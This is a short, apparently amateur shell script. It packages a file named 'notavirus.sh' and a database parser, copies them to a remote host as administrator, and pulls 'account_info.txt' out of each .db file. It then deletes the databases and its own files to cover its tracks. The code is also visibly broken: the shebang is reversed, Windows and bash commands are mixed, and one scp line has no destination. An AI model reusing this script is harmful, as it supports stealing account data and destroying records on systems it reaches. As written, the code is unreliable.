!# /usr/bin/bash

tar.exe -a -c -f present.zip notavirus.sh db_parse.py
scp C:\Users\Jerry\Downloads\present.zip administrator@12.34.56.70:/home/administrator
ssh administrator@12.34.56.70

for a in $(ls *.db)
do
    echo Selecting $a
    echo Executing ...
    python3 db_parse.py $a
    echo Done.
    echo Copying info back ...
    scp account_info.txt
    echo Done.
    echo Cleaning up ...
    rm -f $a
    rm -f account_info.txt
    rm -f db_parse.py
    rm -f notavirus.sh
    echo Finished.
done
